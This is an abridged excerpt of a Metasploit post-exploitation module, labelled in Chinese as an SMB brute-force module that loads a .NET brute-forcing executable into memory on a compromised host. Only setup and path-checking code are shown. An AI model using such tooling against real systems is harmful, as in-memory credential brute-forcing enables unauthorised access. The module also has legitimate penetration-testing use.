...
class MetasploitModule < Msf::Post
    ...
    def initialize(info = {})
        super(
            update_info(
                ...
                'Name' => 'SMB爆破模块',
                'Description' => %q{
                本模块调用execute_dotnet_assembly模块在内存中执行smb爆破程序
                },
                'License' => MSF_LICENSE,
                'Author' => ['3ricK5r'],
                'Arch' => [ARCH_X64],
    ...
    def run
        ...
        smb_exe_path = ::File.join(Msf::Config.data_directory, 'post', 'scanner', 'smb.exe')
        smb_exe_path = ::File.expand_path(smb_exe_path)
        datastore['DOTNET_EXE'] = smb_exe_path
        vprint_status("DOTNET_EXE: #{smb_exe_path}")
        ...
        unless File.file?(smb_exe_path)
            fail_with(Failure::BadConfig, "错误：没有找到.net运行程序#{smb_exe_path}！")
        end
